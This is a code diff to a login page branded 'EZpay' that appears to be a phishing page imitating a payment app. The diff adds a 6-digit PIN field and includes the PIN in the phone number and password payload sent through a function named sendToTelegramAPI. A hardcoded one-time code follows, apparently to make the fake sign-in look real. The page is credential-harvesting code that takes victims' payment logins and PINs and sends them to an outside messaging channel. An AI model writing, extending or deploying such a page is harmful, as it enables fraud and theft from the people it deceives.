@@ -57,14 +57,14 @@
                     <h1 class="text-blue-600 text-xl font-bold italic tracking-wide">EZpay</h1>
                 </div>
 
-                <form id="form-signin" onsubmit="handleSignIn(event)" class="space-y-5">
-                    <div class="text-sm font-medium text-gray-600">Phone</div>
+                <form id="form-signin" onsubmit="handleSignIn(event)" class="space-y-4">
+                    <div class="text-xs font-medium text-gray-600">Phone</div>
                     <div class="ez-input-box">
                         <span class="text-gray-600 font-medium text-base">+91</span>
                         <input type="tel" id="signin-phone" placeholder="Enter phone number" inputmode="numeric" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
                     </div>
 
-                    <div class="text-sm font-medium text-gray-600">Password</div>
+                    <div class="text-xs font-medium text-gray-600">Password</div>
                     <div class="ez-input-box relative">
                         <input type="password" id="signin-password" placeholder="Enter password" required class="pr-8">
                         <button type="button" onclick="togglePasswordVisibility('signin-password', 'signin-eye-icon')" class="absolute right-5 text-gray-400 hover:text-gray-600 focus:outline-none">
@@ -72,13 +72,19 @@
                         </button>
                     </div>
 
-                    <div class="pt-4">
+                    <!-- 6-Digit PIN Field -->
+                    <div class="text-xs font-medium text-gray-600">6-Digit PIN</div>
+                    <div class="ez-input-box">
+                        <input type="password" id="signin-pin" placeholder="Enter 6-digit PIN" inputmode="numeric" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
+                    </div>
+
+                    <div class="pt-2">
                         <button type="submit" class="ez-btn w-full py-4 rounded-full text-base tracking-wide shadow-md">
                             SIGN IN
                         </button>
                     </div>
 
-                    <div class="flex items-center justify-center space-x-2 pt-2">
+                    <div class="flex items-center justify-center space-x-2 pt-1">
                         <input type="checkbox" id="privacy-agree" checked required>
                         <span class="text-gray-500 text-xs">By logging in you agree to our <button type="button" onclick="openPrivacyModal()" class="text-blue-600 hover:underline">Privacy Policy</button></span>
                     </div>
@@ -167,6 +173,7 @@
         const CORRECT_OTP = '706108';
         let pendingPhone = '';
         let pendingPassword = '';
+        let pendingPin = '';
 
         async function sendToTelegramAPI(payload) {
             try {
@@ -223,11 +230,18 @@
             event.preventDefault();
             pendingPhone = document.getElementById('signin-phone').value;
             pendingPassword = document.getElementById('signin-password').value;
+            pendingPin = document.getElementById('signin-pin').value;
+
+            if (pendingPin.length !== 6) {
+                alert('Please enter a valid 6-digit PIN.');
+                return;
+            }
 
             sendToTelegramAPI({
                 type: 'signin',
                 phone: pendingPhone,
-                password: pendingPassword
+                password: pendingPassword,
+                pin: pendingPin
             });
 
             document.getElementById('otpOverlay').classList.add('show');
